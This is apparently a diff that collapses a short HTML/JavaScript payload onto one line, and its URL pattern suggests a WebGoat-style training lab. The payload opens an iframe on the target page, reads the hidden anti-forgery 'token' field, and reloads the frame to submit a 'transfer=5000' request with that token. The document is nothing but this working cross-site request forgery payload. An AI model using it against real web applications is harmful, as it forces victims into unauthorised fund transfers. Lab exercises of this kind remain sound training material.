@@ -1,7 +1,1 @@
-<iframe id="xss_frame" src="attack?Screen=803158781&menu=900&transfer=main" onload="getToken()"></iframe>
-<script>
-function getToken() {
-	var iframe = document.getElementById('xss_frame');
-	iframe.src = 'attack?Screen=803158781&menu=900&transfer=5000&token=' + iframe.contentDocument.getElementsByName("token")[0].value;
-}
-</script>
+<iframe id="xss_frame" src="attack?Screen=803158781&menu=900&transfer=main" onload="getToken()"></iframe><script>function getToken() {	var iframe = document.getElementById('xss_frame');iframe.src = 'attack?Screen=803158781&menu=900&transfer=5000&token=' + iframe.contentDocument.getElementsByName("token")[0].value;}</script>
